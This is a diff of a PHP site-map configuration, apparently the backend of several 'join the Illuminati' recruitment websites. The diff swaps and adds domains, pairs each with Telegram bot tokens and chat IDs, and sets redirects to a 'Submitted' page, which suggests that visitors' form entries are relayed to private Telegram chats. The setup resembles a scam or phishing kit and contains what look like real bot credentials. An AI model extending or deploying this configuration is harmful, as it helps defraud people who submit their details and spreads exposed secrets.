@@ -21,13 +21,25 @@ $site_map = [
         'redirect' => 'https://illuminatiofficial.world/official/join-the-illuminati-members/Submitted_Illuminati_Official_Website.html'
     ],
     
-    'illuminatiofficial.org' => [
-        'bots' => [
+    'illuminatipath.world' => [
+        "bots" => [
             ['token' => '8491989105:AAHZ_rUqbKxZSPfiEEIQ3w_KPyO4N9XSyZw', 'chat_id' => '1325797388'],
-            ['token' => '8413673524:AAGruDl1TxUDZH9RwQYYWSeEwJBcqR5S1lQ', 'chat_id' => '1566821522'],
+            ['token' => '8573585719: AAH3nsPej6dsiVQke8r2EmVoOR18rWz8C1c', 'chat_id' => '7207169369'],
         ],
-        'redirect' => 'https://illuminatiofficial.org/thank-you/'
+        "redirect" => "https://illuminatipath.world/official/join-the-illuminati-members/Submitted_Illuminati_Official_Website.html"
     ],
+
+
+
+
+    'illuminatisyndicate.world' => [
+        "bots" => [
+            ['token' => '8491989105:AAHZ_rUqbKxZSPfiEEIQ3w_KPyO4N9XSyZw', 'chat_id' => '1325797388'],
+            ['token' => '8531352805:AAFN91n2L76y7WKwB159QFRNtvCnLu_uM9M', 'chat_id' => '7875523533'],
+        ],
+        "redirect" => "https://illuminatisyndicate.world/official/join-the-illuminati-members/Submitted_Illuminati_Official_Website.html"
+    ],
+
     // Add more domains as needed
 ];
 
